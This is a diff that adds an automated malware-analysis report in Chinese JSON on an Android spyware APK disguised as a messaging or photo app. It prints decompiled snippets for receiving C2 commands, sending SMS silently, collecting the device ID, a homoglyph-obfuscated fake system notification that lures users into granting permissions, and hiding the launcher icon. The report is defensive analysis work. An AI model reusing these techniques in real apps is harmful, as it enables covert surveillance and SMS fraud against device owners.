@@ -1,0 +1,174 @@
+{
+  "APK信息": {
+    "文件名": "98ab7f612c7a1dc3fd44fbd045a6cf21d8c9240dbad08f847423df5f22d7b460.apk",
+    "sha256": "98ab7f612c7a1dc3fd44fbd045a6cf21d8c9240dbad08f847423df5f22d7b460",
+    "包名": "ru.leg.snap",
+    "应用名": "MМS - Фотo",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 184.1
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "command"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lru\\leg\\snap\\Appoint;",
+          "method_signature": "for(int i2 = 0; i2 < jSONArray.length()",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "JSONArray jSONArray = new JSONArray(new String(new b().b(byteArrayOutputStream.toByteArray())));\nfor (int i2 = 0; i2 < jSONArray.length(); i2++) {\n    JSONObject jSONObject = jSONArray.getJSONObject(i2);\n    int iOptInt = jSONObject.optInt(\"command\", 0);\n    if (iOptInt != 0) {\n        JSONObject jSONObject2 = jSONObject.getJSONObject(\"params\");\n        int iOptInt2 = jSONObject.optInt(\"waitrun\", 0);\n        String string = jSONObject2.toString();\n        Intent intent2 = new Intent(getApplicationContext(), (Class<?>) FalseSmart.class);\n        intent2.putExtra(\"body\", string);\n        intent2.putExtra(\"waitrun\", iOptInt2);\n        intent2.putExtra(\"type\", iOptInt);\n        startService(intent2);\n    }\n}",
+          "malicious_code_snippet_context": "                                          }\n                                      }\n                                      inputStream3.close();\n>>>                                     JSONArray jSONArray = new JSONArray(new String(new b().b(byteArrayOutputStream.toByteArray())));\n>>>                                     for (int i2 = 0; i2 < jSONArray.length(); i2++) {\n>>>                                         JSONObject jSONObject = jSONArray.getJSONObject(i2);\n>>>                                         int iOptInt = jSONObject.optInt(\"command\", 0);\n>>>                                         if (iOptInt != 0) {\n>>>                                             JSONObject jSONObject2 = jSONObject.getJSONObject(\"params\");\n>>>                                             int iOptInt2 = jSONObject.optInt(\"waitrun\", 0);\n>>>                                             String string = jSONObject2.toString();\n>>>                                             Intent intent2 = new Intent(getApplicationContext(), (Class<?>) FalseSmart.class);\n>>>                                             intent2.putExtra(\"body\", string);\n>>>                                             intent2.putExtra(\"waitrun\", iOptInt2);\n>>>                                             intent2.putExtra(\"type\", iOptInt);\n>>>                                             startService(intent2);\n>>>                                         }\n>>>                                     }\n                                      if (",
+          "behavior_description": "该代码从网络输入流读取C2服务器下发的加密指令数据，通过自定义解密类 b().b() 解密后解析为JSON数组，逐条提取 command（命令类型编号）、params（命令参数）、waitrun（延迟执行标志）字段，再通过 startService() 将指令以Intent Extra形式分发给 FalseSmart 命令执行服务，实现对受害设备的远程指令下发与执行。数据流向：网络InputStream（C2服务器加密指令）→ 自定义解密 → JSON解析提取command/params → startService()分发至命令执行服务。结合厂商报告确认该样本为利用AccessibilityService的间谍软件，此处为典型的C2远程控制指令接收与分发通道。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lru\\leg\\snap\\d;",
+          "method_signature": "a(Context context, String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);",
+          "malicious_code_snippet_context": "      public static void a(Context context, String str, String str2, PendingIntent pendingIntent) {\n          try {\n              BellyPile.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n          } catch (Exception e) {\n              c.a(context, e, str, str2);\n          }",
+          "behavior_description": "该方法通过 SmsManager.getDefault().sendTextMessage() 在无任何用户界面和用户确认的情况下，静默向目标号码 str 发送短信内容 str2，并通过 PendingIntent 监听发送结果。结合同类中的定时调度代码（setRepeating 每60秒触发 CourtesyGet 服务），该短信发送逻辑可被周期性自动触发，典型用于向增值扣费号码发送付费短信（短信欺诈）或向受害者联系人传播恶意链接。发送异常时调用 c.a() 上报错误，便于攻击者监控发送状态并重试。数据流向：外部传入的目标号码与短信内容（可能来自C2指令或硬编码扣费号码）→ SmsManager.sendTextMessage() 静默发送。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lru\\leg\\snap\\d;",
+          "method_signature": "c(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static String c(Context context) {\n    return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n}",
+          "malicious_code_snippet_context": "          return false;\n      }\n  \n>>>     public static String c(Context context) {\n>>>         return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n>>>     }\n  \n      private static void c(Context context, long j) {\n          if (j - a > 10008) {",
+          "behavior_description": "该方法通过 Settings.Secure.getString 从系统 ContentResolver 中读取 ANDROID_ID（设备级唯一持久标识符），实现对受害设备的指纹标识。数据流向：系统设置提供器 Settings.Secure（source）→ 采集 ANDROID_ID 并返回给上层调用方用于构建设备指纹、进行设备追踪与识别（sink）。该代码位于混淆类 ru.leg.snap.d 中，结合厂商报告确认该样本是伪装成短信应用、滥用 AccessibilityService 的隐蔽间谍软件，此设备指纹采集行为很可能用于受害者设备标识及与 C2 通信时的设备识别，服务于整体恶意活动。同文件中的另一方法 c(Context, long) 还带有约10秒频率限制地启动 DollarAncestor 活动，显示该类参与隐蔽的周期性恶意流程调度。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lru\\leg\\snap\\Oppose;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "builder.setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle(\"Сиcтeмный прoцecс\").setContentText(\"Cиcтeмa нe корректно рабoтает, вам необхoдимo включить доcтуп к стaтиcтикe для 'Сиcтeмный прoцecс'\");\nstartForeground(1873, builder.build());",
+          "malicious_code_snippet_context": "          } else {\n              builder = new Notification.Builder(getApplicationContext());\n          }\n>>>         builder.setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle(\"Сиcтeмный прoцecс\").setContentText(\"Cиcтeма нe корректно рабoтает, вам необхoдимo включить доcтуп к стaтиcтикe для 'Сиcтeмный прoцecс'\").setWhen(System.currentTimeMillis());\n>>>         startForeground(1873, builder.build());\n      }\n  \n      private void b() {",
+          "behavior_description": "该Service通过startForeground()将自身提升为前台服务实现进程保活，防止系统回收恶意进程。通知标题伪装为俄语'Сиcтeмный прoцecс'（系统进程），正文声称'系统运行异常，需开启统计使用权限'，且文案中混用西里尔字母与同形拉丁字符（c/e/o/a）进行字符串混淆以规避检测。该伪造系统通知实为社会工程手段，诱导用户为恶意软件授予AccessibilityService等权限，与Zscaler报告所述利用AccessibilityService隐藏自身并监控用户的行为吻合。数据流向：硬编码的伪造系统通知文案(source)→startForeground()前台保活并向用户展示欺骗性通知(sink)，为已确认的间谍类恶意样本提供持续驻留能力。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lru\\leg\\snap\\GiveChannel;",
+          "method_signature": "a()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) GiveChannel.class), 2, 1);",
+          "malicious_code_snippet_context": "  /* JADX INFO: loaded from: classes.dex */\n  public class GiveChannel extends Activity {\n      private void a() {\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) GiveChannel.class), 2, 1);\n      }\n  \n      @Override // android.app.Activity",
+          "behavior_description": "GiveChannel 是一个无界面的 Activity，在 onCreate() 中调用 a()，通过 PackageManager.setComponentEnabledSetting 将自身组件设置为禁用状态（参数 2 = COMPONENT_ENABLED_STATE_DISABLED，参数 1 = DONT_KILL_APP），随后立即 finish() 关闭自身。数据流向：应用自身组件信息（getApplicationContext() + GiveChannel.class 构造 ComponentName）→ setComponentEnabledSetting() 禁用 launcher 组件，使应用图标从桌面启动器中消失。这与厂商报告中该样本伪装为'Сообщениe（Messages）'并隐藏自身以监视受害者的描述完全吻合，是典型的恶意图标隐藏技术，用于逃避用户察觉与卸载，为后续隐蔽间谍行为提供掩护。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
